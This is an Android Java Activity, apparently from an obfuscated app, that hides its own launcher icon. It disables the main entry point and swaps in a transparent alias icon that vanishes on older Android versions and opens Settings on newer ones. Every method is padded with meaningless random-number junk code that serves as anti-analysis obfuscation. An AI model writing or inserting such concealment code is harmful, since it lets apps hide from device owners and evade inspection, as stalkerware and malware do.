package xuf.xnxk.syxqk;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（HSV），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class VWNO extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        long arr_RDhKl = java.lang.System.nanoTime();
        int i_aihhMENxmfgQ = new java.util.Random().nextInt(1000);
        boolean j_RvegiQ = (arr_RDhKl % (i_aihhMENxmfgQ + 43)) > 7;
        double tmp_HoSBub = j_RvegiQ ? java.lang.Math.sqrt(i_aihhMENxmfgQ) : java.lang.Math.pow(i_aihhMENxmfgQ, 85);
        if (tmp_HoSBub < 0.0) {
            java.lang.System.out.println(tmp_HoSBub);
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(VWNO.this, HSV.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(VWNO.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        int process_CYxqBACVc = new java.util.Random().nextInt(50);
        int stack_JvINpe = (process_CYxqBACVc > 29) ? 1 : ((process_CYxqBACVc > 30) ? 81 : ((process_CYxqBACVc > 80) ? 52 : 48));
        int i_FRnUTQsPhZe = stack_JvINpe * process_CYxqBACVc;
        if (i_FRnUTQsPhZe > 14) {
            java.lang.System.arraycopy(new int[] { i_FRnUTQsPhZe }, 0, new int[] { 0 }, 0, 1);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        java.lang.Object arr_YezXFBzDfnfm = new java.lang.Object();
        int i_TBwspUVAlq = arr_YezXFBzDfnfm.hashCode();
        int j_SSHmSJFecxFbdvRd = new java.util.Random().nextInt(100);
        int tmp_ILeFPQYZGetNtVzJj = (i_TBwspUVAlq ^ j_SSHmSJFecxFbdvRd) & 0x7FFFFFFF;
        if (tmp_ILeFPQYZGetNtVzJj == 43 && i_TBwspUVAlq < 9) {
            arr_YezXFBzDfnfm.toString();
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        long arr_RDhKl = java.lang.System.nanoTime();
        int i_aihhMENxmfgQ = new java.util.Random().nextInt(1000);
        boolean j_RvegiQ = (arr_RDhKl % (i_aihhMENxmfgQ + 43)) > 7;
        double tmp_HoSBub = j_RvegiQ ? java.lang.Math.sqrt(i_aihhMENxmfgQ) : java.lang.Math.pow(i_aihhMENxmfgQ, 85);
        if (tmp_HoSBub < 0.0) {
            java.lang.System.out.println(tmp_HoSBub);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
